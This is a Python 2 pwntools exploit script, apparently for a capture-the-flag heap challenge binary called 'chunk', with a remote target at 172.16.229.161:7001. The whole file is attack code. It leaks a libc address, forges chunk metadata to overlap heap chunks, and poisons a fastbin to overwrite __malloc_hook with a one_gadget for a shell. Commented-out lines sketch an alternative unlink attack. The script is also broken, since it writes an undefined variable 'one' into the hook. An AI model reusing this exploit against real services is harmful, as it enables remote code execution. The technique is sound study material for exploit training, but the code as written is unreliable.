#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./chunk')
if local:
    p = process('./chunk')
    libc = elf.libc
else:
    p = remote('172.16.229.161',7001)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def malloc(index,size):
    ru("Your choice: ")
    sl('1')
    ru("Give me a book ID: ")
    sl(str(index))
    ru("how long: ")
    sl(str(size))

def free(index):
    ru("Your choice: ")
    sl('3')
    ru("Which one to throw?")
    sl(str(index))

def show(index):
    ru("Your choice: ")
    sl('2')
    ru("Which book do you want to show?")
    sl(str(index))

def edit(index,content):
    ru("Your choice: ")
    sl('4')
    ru("Which book to write?")
    sl(str(index))
    ru("Content: ")
    sd(content)


malloc(0,0x200)
malloc(1,0x68)
malloc(2,0x68)
malloc(3,0xf0)
malloc(4,0x20)
free(0)
malloc(0,0x200)
show(0)     
# debug(0)  
# show(0)
ru("Content: ")
addr = u64(rc(6).ljust(8,'\x00'))-0x3c4b78
# global_max_fast =  addr + 0x1c80
print "addr--->" + hex(addr)
system = addr+libc.sym["system"]
binsh = addr+libc.search("/bin/sh\x00").next()
malloc_hook = addr+libc.sym["__malloc_hook"]
py = ''
py += 'a'*0x60
py += p64(0x2f0)+'\x00'
edit(2,py)
free(0)
free(3)
malloc(5,0x200)
malloc(6,0x68)
malloc(7,0x68)
malloc(8,0xf0)
free(7)
edit(2,p64(malloc_hook-0x23))
malloc(9,0x68)
malloc(10,0x68)
edit(10,p64(one))
# free(2)
# free(1)
debug(0)
# print "fast--->" + hex(global_max_fast)
# py = ''
# py += p64(0) + p64(global_max_fast-0x10)
# edit(0,0x200,py)
# malloc(7,0x100)
# chunk = 0x0000000000602280+0x10
# malloc(0,0x100)
# malloc(1,0x200)
# malloc(2,0x100)
# malloc(3,0x100)
# fd = chunk-0x18
# bk = chunk-0x10
# py = ''
# py += p64(0) + p64(0x101)
# py += p64(fd) + p64(bk)
# py = py.ljust(0x100,'\x00')
# py += p64(0x100) + p64(0x210)
# edit(0,0x110,py)
# gdb.attach(p,'b *0x0000000000400B94')
# free(1)

p.interactive()